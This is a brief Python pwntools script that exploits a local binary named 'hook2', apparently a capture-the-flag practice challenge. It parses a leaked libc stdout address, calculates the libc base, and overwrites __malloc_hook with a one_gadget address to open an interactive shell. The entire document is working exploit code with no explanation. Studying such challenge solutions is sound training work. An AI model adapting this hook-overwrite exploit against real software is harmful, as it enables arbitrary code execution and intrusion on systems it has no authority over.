# hook2.py
from pwn import *
p = process("./hook2")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
print(p.recvuntil("stdout@LIBC addr: "))

libc_stdout = int(p.recvuntil("\n").strip("\n"),16)
print("libc.symbols : stdout", hex(libc.symbols["_IO_2_1_stdout_"]))
libc_base = libc_stdout - libc.symbols["_IO_2_1_stdout_"]
malloc_hook = libc_base + 0x3ebc30
free_hook = libc_base + 0x3ed8e8
oneshot_gadget = libc_base + 0x4f2a5
payload = p64(malloc_hook)      

#payload = p64(free_hook)       
payload += p64(oneshot_gadget)  

p.sendline(payload)

p.interactive()

